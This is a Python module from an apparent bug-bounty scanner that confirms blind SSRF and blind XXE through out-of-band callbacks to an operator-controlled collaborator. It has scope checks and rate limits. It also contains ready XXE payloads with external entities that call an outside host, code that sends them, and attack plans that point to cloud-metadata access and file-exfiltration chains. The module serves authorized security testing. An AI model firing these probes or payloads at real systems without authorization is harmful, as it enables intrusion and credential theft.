"""GreyIQ BugHunter — out-of-band (OOB) confirmation via an operator collaborator.

Confirms BLIND vulnerabilities that never reflect anything in the target's own response —
blind SSRF above all — by injecting a unique callback URL that points at the OPERATOR's
own OOB collaborator (the greynoc-chat ``/oob`` endpoint), sending a benign GET probe to
the in-scope target, then polling the collaborator's authenticated ``/api/oob/<token>``
for an inbound hit. A recorded hit PROVES the target reached out of band.

Config (operator-supplied, kept in GreyIQ's secrets store — never hardcoded): the
collaborator BASE URL (your phone's public tunnel, e.g. ``https://chat.example``) and the
``OOB_SECRET`` bearer. The target probe is scope-bound + SSRF-guarded exactly like the
rest of the active prover; the collaborator poll is a separate authenticated call to YOUR
OWN host. Also usable standalone: mint a token, paste the callback URL into a manual XXE /
blind-XSS payload, and poll for the hit.

GET-only target probes, marker-token correlation, bounded polling. Pure/frozen-safe
(stdlib urllib + the existing guarded active HTTP).
"""

from __future__ import annotations

import json
import re
import secrets as _secrets
import time
import urllib.error
import urllib.request
from typing import Any
from urllib.parse import urlparse

# A callback from a SOCIAL UNFURLER or SEARCH CRAWLER is NOT the target's own server-side
# fetch — downgrade such an OOB hit to a candidate. NOTE: generic HTTP-library UAs
# (curl/wget/python-requests/Go-http-client/Java/okhttp) are deliberately NOT here — those
# ARE what a vulnerable server's SSRF fetch typically sends, so they must stay 'confirmed'.
_CRAWLER_UA_RE = re.compile(
    r"\bbot\b|googlebot|bingbot|crawl|spider|slurp|facebookexternalhit|slackbot|"
    r"twitterbot|whatsapp|telegrambot|discordbot|link.?preview|unfurl",
    re.IGNORECASE,
)


def _is_crawler_ua(ua: str) -> bool:
    return bool(_CRAWLER_UA_RE.search(str(ua or "")))

from bughunter.active_verify_service import (
    _ActiveError,
    _Http,
    _NoRedirect,
    _candidate_params,
    _with_query,
    host_in_active_scope,
)
from bughunter.rate_limit import HostRateGovernor
from bughunter.settings import get_settings
from bughunter.web_ingest import WebsiteFetchError, normalize_website_url
from bughunter.web_scan_service import _USER_AGENT, _guard_url


def mint_token() -> str:
    """A unique, unguessable correlation token for one OOB probe."""
    return _secrets.token_hex(16)  # 32 hex chars; matches the collaborator's [A-Za-z0-9]{6,64}


def callback_url(base: str, token: str) -> str:
    """The callback URL the target is asked to reach: <collaborator>/oob/<token>."""
    return f"{str(base or '').rstrip('/')}/oob/{token}"


def poll_collaborator(base: str, secret: str, token: str, *, timeout: float = 8.0) -> dict[str, Any]:
    """GET the collaborator's authed poll endpoint for a token's interactions. Hits the
    OPERATOR's own host (not the target). Returns {ok, count, hits} or {ok: False, error}."""
    base = str(base or "").strip().rstrip("/")
    if not base or not secret:
        return {"ok": False, "error": "OOB collaborator URL + secret are not configured."}
    if not token:
        return {"ok": False, "error": "No token to poll."}
    url = f"{base}/api/oob/{token}"
    request = urllib.request.Request(url, method="GET", headers={
        "Authorization": f"Bearer {secret}", "User-Agent": _USER_AGENT, "Accept": "application/json"})
    try:
        with urllib.request.urlopen(request, timeout=timeout) as resp:
            data = json.loads(resp.read(1_000_000).decode("utf-8", "replace"))
    except urllib.error.HTTPError as exc:
        if exc.code == 401:
            return {"ok": False, "error": "collaborator poll unauthorized — check the OOB secret."}
        return {"ok": False, "error": f"collaborator poll HTTP {exc.code}"}
    except (urllib.error.URLError, OSError, ValueError, json.JSONDecodeError) as exc:
        return {"ok": False, "error": f"collaborator poll failed: {exc}"}
    # The collaborator's response may not be a JSON object (a misconfigured tunnel/proxy,
    # a load-balancer error page rendered as JSON, or a buggy collaborator could return an
    # array/string/number) — normalize to {} so a non-dict body never crashes the poll.
    data = data if isinstance(data, dict) else {}
    return {"ok": True, "count": int(data.get("count") or 0), "hits": data.get("hits") or []}


def _build_ssrf_finding(target_url: str, param: str, token: str, base: str, hit: dict[str, Any], confirmed: bool = True) -> dict[str, Any]:
    word = "confirmed" if confirmed else "callback from a non-server source — candidate"
    return {
        "rule_id": "active.blind-ssrf-oob",
        "title": f"Blind SSRF via '{param}' (out-of-band {word})",
        "severity": "high",
        "confidence": "high" if confirmed else "medium",
        "category": "ssrf",
        "location": target_url,
        "file_path": target_url,
        "line_start": 1, "line_end": 1,
        "class_id": "ssrf",
        "class_name": "Server-side request forgery (SSRF)",
        "cwe": "CWE-918",
        "owasp": "A10:2021 Server-Side Request Forgery (SSRF)",
        "references": [
            "https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/",
            "https://portswigger.net/web-security/ssrf",
        ],
        "remediation": ("Validate and allow-list the outbound destination; resolve and pin it, reject internal/"
                        "metadata ranges, and disable unused URL schemes/redirfollowing."),
        "snippet": "",  # the proof is the OOB callback, not target data
        "proof_evidence": {
            "request_line": f"GET {_with_query(target_url, {param: callback_url(base, token)})}",
            "response_status": f"collaborator hit: {hit.get('method', 'GET')} {hit.get('path', '/oob/' + token)}",
            "matched_value": (f"an out-of-band {hit.get('method', 'GET')} request reached the collaborator token "
                              f"{token} (source {hit.get('ip', '?')}, UA {(hit.get('headers') or {}).get('user-agent', '?')}) "
                              f"after '{param}' was set to the callback URL — "
                              + ("blind SSRF confirmed (the fresh token was empty before the probe)"
                                 if confirmed else "but the source looks like a crawler/preview bot, not the target's own fetch; verify the source before submitting")),
        },
    }


def _ssrf_plan(target_url: str, param: str, token: str, base: str, hit: dict[str, Any], confirmed: bool = True) -> dict[str, Any]:
    cb = callback_url(base, token)
    return {
        "steps": [
            f"Set the '{param}' parameter to a callback URL on a collaborator you control: {cb}",
            f"Send: GET {_with_query(target_url, {param: cb})}",
            f"Observe an inbound {hit.get('method', 'GET')} hit on the collaborator for token {token} "
            f"(from {hit.get('ip', 'the target')}) — the server fetched the attacker-supplied URL.",
            "Re-point the parameter at an internal/metadata URL (in scope) to assess reachability and impact.",
        ],
        "poc": f"GET {_with_query(target_url, {param: cb})}\n# -> out-of-band callback recorded at {base}/oob/{token}",
        "impact": ("The server can be made to issue requests to attacker-chosen hosts — internal services, cloud "
                   "metadata (credential theft), and otherwise-unreachable infrastructure behind the firewall."),
        "cvss": {"vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N", "base_score": 8.5, "base_severity": "high", "estimated": True},
        "remediation": "Allow-list outbound destinations; block internal/metadata ranges; pin the resolved IP.",
        "proof_of_impact": {
            "status": "confirmed" if confirmed else "candidate",
            "method": "out-of-band callback (collaborator) — GET-only probe, no data exfiltrated into the report",
            "affected_asset": "internal services and cloud metadata reachable from the server",
            "observed_result": (f"setting '{param}' to the collaborator URL caused the target to make an out-of-band "
                                f"{hit.get('method', 'GET')} request to token {token}"),
            "control_result": "without the injected callback the collaborator records nothing for this fresh token",
            "evidence": f"collaborator interaction for token {token} ({hit.get('method', 'GET')} {hit.get('path', '')})",
        },
    }


def confirm_blind_ssrf(
    target_url: str,
    *,
    base: str,
    secret: str,
    scope: str = "",
    settings: Any = None,
    extra_params: list[str] | None = None,
    governor: HostRateGovernor | None = None,
    http: _Http | None = None,
    poll_attempts: int = 4,
    poll_delay_s: float = 2.0,
) -> dict[str, Any]:
    """Inject a fresh collaborator callback URL into each candidate param of an in-scope
    target, send a GET probe, and poll the collaborator for a hit. Returns
    ``{ok, status, finding?, attack_plan?, detail}``; status is ``confirmed`` (a hit
    landed) or ``no-callback`` (none did)."""
    settings = settings or get_settings()
    if not str(base or "").strip() or not str(secret or "").strip():
        return {"ok": False, "error": "Configure the OOB collaborator URL + secret first."}
    try:
        normalized = normalize_website_url(target_url)
    except WebsiteFetchError as exc:
        return {"ok": False, "error": str(exc)}
    host = urlparse(normalized).hostname or ""
    if not host_in_active_scope(host, scope, settings):
        return {"ok": False, "error": f"'{host}' is not named in your scope — OOB probing is fail-closed."}
    try:
        sanitized = _guard_url(normalized, settings.allow_private_urls, settings.web_allowed_ports)
    except WebsiteFetchError as exc:
        return {"ok": False, "error": f"target refused by the URL guard: {exc}"}

    governor = governor or HostRateGovernor(
        capacity=settings.active_max_requests_per_host, min_interval_s=settings.active_min_interval_ms / 1000.0)
    http = http or _Http(settings, governor, max_requests=10)
    params = _candidate_params(sanitized, extra_params, ("url", "next", "dest", "uri", "callback", "u"), 3)
    tried: list[str] = []
    poll_errors: list[str] = []
    for param in params:
        token = mint_token()
        # Pre-probe NEGATIVE CONTROL: the fresh, unguessable token must be empty. If it
        # already carries hits (collision / a shared collaborator), skip it — we can't
        # attribute a later hit to our probe.
        pre = poll_collaborator(base, secret, token, timeout=settings.web_fetch_timeout_seconds)
        if not pre.get("ok"):
            poll_errors.append(pre.get("error", "poll failed"))
            continue
        if pre.get("count"):
            continue
        probe_url = _with_query(sanitized, {param: callback_url(base, token)})
        try:
            http.fetch(probe_url)  # the target makes the OOB call if vulnerable
        except _ActiveError:
            continue
        tried.append(param)
        for _ in range(max(1, poll_attempts)):
            time.sleep(max(0.0, poll_delay_s))
            res = poll_collaborator(base, secret, token, timeout=settings.web_fetch_timeout_seconds)
            if not res.get("ok"):
                poll_errors.append(res.get("error", "poll failed"))
                break  # transient poll failure for THIS param — move on, don't abort the sweep
            if res.get("count"):
                # The token went 0 -> N only AFTER our probe, and it is unguessable, so the
                # callback resulted from this probe. A known crawler/bot/link-preview UA is
                # downgraded to a CANDIDATE (it may be a log-scanner / unfurler, not the
                # target's own server-side fetch).
                hit = (res.get("hits") or [{}])[0]
                ua = (hit.get("headers") or {}).get("user-agent", "")
                confirmed = not _is_crawler_ua(ua)
                finding = _build_ssrf_finding(sanitized, param, token, base, hit, confirmed)
                finding["ref"] = "F1"
                return {"ok": True, "status": "confirmed" if confirmed else "candidate",
                        "param": param, "token": token, "finding": finding,
                        "attack_plan": _ssrf_plan(sanitized, param, token, base, hit, confirmed),
                        "detail": {"hit": hit, "negative_control": "the fresh token was empty before the probe"}}
    if not tried and poll_errors:
        return {"ok": False, "error": poll_errors[0]}
    return {"ok": True, "status": "no-callback", "params_tried": tried, "poll_errors": poll_errors,
            "reason": "no out-of-band callback was observed for these parameters (no blind SSRF proven here)."}


# ---- Blind XXE over OOB -------------------------------------------------------------------
def build_xxe_payloads(base: str, token: str) -> dict[str, str]:
    """Ready-to-deliver blind-XXE payload variants with the collaborator callback embedded as
    an EXTERNAL ENTITY. The entity only makes the parser fetch the callback (proving external-
    entity resolution) — it reads NO target file, so confirmation never exfiltrates data.
    The operator pastes one of these into an XML-parsing endpoint (or GreyIQ POSTs ``classic``
    via the opt-in --send)."""
    cb = callback_url(base, token)
    return {
        "classic": (f'<?xml version="1.0" encoding="UTF-8"?>\n'
                    f'<!DOCTYPE r [<!ENTITY xxe SYSTEM "{cb}">]>\n<r>&xxe;</r>'),
        "parameter_entity": (f'<?xml version="1.0" encoding="UTF-8"?>\n'
                             f'<!DOCTYPE r [<!ENTITY % ext SYSTEM "{cb}"> %ext;]>\n<r>probe</r>'),
        "svg": (f'<?xml version="1.0" encoding="UTF-8"?>\n'
                f'<!DOCTYPE svg [<!ENTITY xxe SYSTEM "{cb}">]>\n'
                f'<svg xmlns="http://www.w3.org/2000/svg" width="1" height="1">&xxe;</svg>'),
        "soap": (f'<?xml version="1.0" encoding="UTF-8"?>\n'
                 f'<!DOCTYPE soap:Envelope [<!ENTITY xxe SYSTEM "{cb}">]>\n'
                 f'<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">'
                 f'<soap:Body><probe>&xxe;</probe></soap:Body></soap:Envelope>'),
    }


def _post_xml(url: str, xml: str, *, timeout: float) -> dict[str, Any]:
    """POST a fixed XML body to an ALREADY scope-checked + SSRF-guarded URL, never following a
    redirect (so the body can't be replayed off-host). The only non-GET egress in the engine,
    reached solely via the opt-in --send. An HTTP error response is fine — the external entity
    may still have been resolved during parsing before the error was produced."""
    request = urllib.request.Request(
        url, data=xml.encode("utf-8"), method="POST",
        headers={"Content-Type": "application/xml", "User-Agent": _USER_AGENT, "Accept": "*/*"})
    opener = urllib.request.build_opener(_NoRedirect())
    try:
        with opener.open(request, timeout=timeout) as resp:
            return {"ok": True, "status": getattr(resp, "status", 0)}
    except urllib.error.HTTPError as exc:
        return {"ok": True, "status": exc.code}
    except (urllib.error.URLError, OSError, ValueError) as exc:
        return {"ok": False, "error": f"XML POST failed: {exc}"}


def _build_xxe_finding(target_url: str, token: str, base: str, hit: dict[str, Any], confirmed: bool = True) -> dict[str, Any]:
    word = "confirmed" if confirmed else "callback from a non-server source — candidate"
    ua = (hit.get("headers") or {}).get("user-agent", "?")
    return {
        "rule_id": "active.blind-xxe-oob",
        "title": f"Blind XXE (out-of-band {word})",
        "severity": "high",
        "confidence": "high" if confirmed else "medium",
        "category": "xxe",
        "location": target_url,
        "file_path": target_url,
        "line_start": 1, "line_end": 1,
        "class_id": "xxe",
        "class_name": "XML External Entity (XXE)",
        "cwe": "CWE-611",
        "owasp": "A05:2021 Security Misconfiguration",
        "references": [
            "https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing",
            "https://portswigger.net/web-security/xxe/blind",
        ],
        "remediation": ("Disable external-entity and DTD processing in the XML parser (set FEATURE_SECURE_PROCESSING / "
                        "disallow-doctype-decl; for libxml2 do not set NOENT/DTDLOAD). Prefer a hardened parser config."),
        "snippet": "",  # the proof is the OOB callback, not any file contents — nothing is exfiltrated
        "proof_evidence": {
            "request_line": f"POST {target_url}  (Content-Type: application/xml)",
            "response_status": f"collaborator hit: {hit.get('method', 'GET')} {hit.get('path', '/oob/' + token)}",
            "matched_value": (f"the XML parser resolved an external entity and made an out-of-band "
                              f"{hit.get('method', 'GET')} request to collaborator token {token} "
                              f"(source {hit.get('ip', '?')}, UA {ua}) — "
                              + ("blind XXE confirmed (the fresh token was empty before the probe)" if confirmed
                                 else "but the source looks like a crawler/preview bot; verify the source before submitting")),
        },
    }


def _xxe_plan(target_url: str, token: str, base: str, hit: dict[str, Any], confirmed: bool = True) -> dict[str, Any]:
    cb = callback_url(base, token)
    return {
        "steps": [
            f"Submit an XML document containing an external entity pointing at a collaborator you control: {cb}",
            f"Send it to the XML-parsing endpoint at {target_url} (Content-Type: application/xml).",
            f"Observe an inbound {hit.get('method', 'GET')} hit on the collaborator for token {token} "
            f"(from {hit.get('ip', 'the target')}) — the parser resolved the external entity.",
            "Escalate within scope: swap the entity for an internal/metadata URL (blind SSRF via XXE) or a "
            "parameter-entity exfil chain to read local files — only as far as your authorization allows.",
        ],
        "poc": f"POST {target_url}\nContent-Type: application/xml\n\n{build_xxe_payloads(base, token)['classic']}\n"
               f"# -> out-of-band callback recorded at {cb}",
        "impact": ("XML external-entity processing lets an attacker make the server fetch attacker-chosen URLs "
                   "(internal services, cloud metadata) and, depending on the parser, read local files — SSRF and "
                   "file disclosure from a single XML submission."),
        "cvss": {"vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N", "base_score": 8.6, "base_severity": "high", "estimated": True},
        "remediation": "Disable DTDs / external-entity resolution in the XML parser; use a hardened, secure-processing config.",
        "proof_of_impact": {
            "status": "confirmed" if confirmed else "candidate",
            "method": "out-of-band callback (collaborator) — the external entity only fetches the callback; no file is exfiltrated into the report",
            "affected_asset": "internal services / cloud metadata (via XXE-SSRF) and, depending on the parser, local files",
            "observed_result": f"the XML parser at the endpoint made an out-of-band {hit.get('method', 'GET')} request to token {token}",
            "control_result": "without the injected external entity the collaborator records nothing for this fresh token",
            "evidence": f"collaborator interaction for token {token} ({hit.get('method', 'GET')} {hit.get('path', '')})",
        },
    }


def _xxe_finding_from_hit(sanitized: str, token: str, base: str, hit: dict[str, Any]) -> dict[str, Any]:
    ua = (hit.get("headers") or {}).get("user-agent", "")
    confirmed = not _is_crawler_ua(ua)
    finding = _build_xxe_finding(sanitized, token, base, hit, confirmed)
    finding["ref"] = "F1"
    return {"ok": True, "status": "confirmed" if confirmed else "candidate", "token": token,
            "finding": finding, "attack_plan": _xxe_plan(sanitized, token, base, hit, confirmed),
            "detail": {"hit": hit, "negative_control": "the fresh token was empty before the probe"}}


def confirm_blind_xxe(
    target_url: str,
    *,
    base: str,
    secret: str,
    scope: str = "",
    send: bool = False,
    token: str | None = None,
    settings: Any = None,
    poll_attempts: int = 4,
    poll_delay_s: float = 2.0,
) -> dict[str, Any]:
    """Confirm blind XXE out-of-band. Two modes:

    * **Assisted (default, GET-only):** mint a token, hand back ready XXE payload variants with
      the callback embedded (status ``ready``); the operator delivers one to an XML endpoint,
      then re-calls with the SAME ``token`` to poll — a recorded hit builds the confirmed finding.
    * **Auto (``send=True``):** GreyIQ itself POSTs the ``classic`` payload to the in-scope,
      SSRF-guarded target (the only non-GET egress), then polls. Negative-control + crawler-UA
      hardening identical to the SSRF path.
    """
    settings = settings or get_settings()
    if not str(base or "").strip() or not str(secret or "").strip():
        return {"ok": False, "error": "Configure the OOB collaborator URL + secret first."}
    try:
        normalized = normalize_website_url(target_url)
    except WebsiteFetchError as exc:
        return {"ok": False, "error": str(exc)}
    host = urlparse(normalized).hostname or ""
    if not host_in_active_scope(host, scope, settings):
        return {"ok": False, "error": f"'{host}' is not named in your scope — OOB probing is fail-closed."}
    try:
        sanitized = _guard_url(normalized, settings.allow_private_urls, settings.web_allowed_ports)
    except WebsiteFetchError as exc:
        return {"ok": False, "error": f"target refused by the URL guard: {exc}"}

    fresh = not str(token or "").strip()
    token = str(token or "").strip() or mint_token()
    payloads = build_xxe_payloads(base, token)

    if send:
        # Pre-probe NEGATIVE CONTROL before we POST: the token must be empty, else a later hit
        # can't be attributed to our probe.
        pre = poll_collaborator(base, secret, token, timeout=settings.web_fetch_timeout_seconds)
        if not pre.get("ok"):
            return {"ok": False, "error": pre.get("error", "collaborator poll failed")}
        if pre.get("count"):
            return {"ok": False, "error": "the collaborator token already has hits before the probe — mint a fresh one and retry."}
        post = _post_xml(sanitized, payloads["classic"], timeout=settings.web_fetch_timeout_seconds)
        if not post.get("ok"):
            return {"ok": True, "status": "send-failed", "token": token, "payloads": payloads, "error": post.get("error")}
        poll_errors: list[str] = []
        for _ in range(max(1, poll_attempts)):
            time.sleep(max(0.0, poll_delay_s))
            res = poll_collaborator(base, secret, token, timeout=settings.web_fetch_timeout_seconds)
            if not res.get("ok"):
                poll_errors.append(res.get("error", "poll failed"))
                break
            if res.get("count"):
                return _xxe_finding_from_hit(sanitized, token, base, (res.get("hits") or [{}])[0])
        return {"ok": True, "status": "no-callback", "token": token, "sent": True, "payloads": payloads,
                "poll_errors": poll_errors,
                "reason": "the payload was sent (POST) but no out-of-band callback was observed (no blind XXE proven here)."}

    # Assisted mode.
    if fresh:
        return {"ok": True, "status": "ready", "token": token, "payloads": payloads,
                "callback_url": callback_url(base, token),
                "reason": (f"Deliver one of these XXE payloads to an XML-parsing endpoint out of band, then re-run with "
                           f"token {token} to poll for the callback (or pass send=True to have GreyIQ POST the classic payload).")}
    # Re-poll a token the operator already delivered to (its negative control was the fresh mint).
    res = poll_collaborator(base, secret, token, timeout=settings.web_fetch_timeout_seconds)
    if not res.get("ok"):
        return {"ok": False, "error": res.get("error", "collaborator poll failed")}
    if res.get("count"):
        return _xxe_finding_from_hit(sanitized, token, base, (res.get("hits") or [{}])[0])
    return {"ok": True, "status": "no-callback", "token": token, "payloads": payloads,
            "reason": "no callback yet for this token — deliver the payload to an XML endpoint, then poll again."}
